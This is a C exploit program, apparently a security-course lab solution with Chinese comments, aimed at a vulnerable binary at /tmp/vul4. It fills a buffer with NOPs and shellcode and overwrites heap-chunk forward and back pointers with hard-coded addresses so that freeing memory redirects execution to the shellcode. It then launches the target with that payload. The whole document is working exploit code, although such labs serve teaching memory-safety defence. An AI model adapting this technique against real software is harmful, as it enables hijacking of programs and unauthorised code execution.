#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul4"

int main(void)
{
  char payload[1024];
  memset(payload,'\x90',sizeof(payload));
  //小端序是4，而不是7
  payload[4] = '\x1';//将p的后指针标记为空闲
  memcpy(payload + 12,shellcode,strlen(shellcode));
  //504-508为q的前指针(p)，508-512为q的后指针（ret)
  memcpy(payload + 504,"\x48\x90\x55\x56\x5c\xda\xff\xff",8);
  //执行shellcode之前，进入的是前指针，所以要将左指针设置为跳转指令，跳转到shellcode处
  payload[2] = '\xeb';//jmp指令
  payload[3] = '\x08';//jmp 偏移量为8个字节
  payload[1023] = '\0';//结尾标志

  char *args[] = { TARGET, payload , NULL};//定义运行参数
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
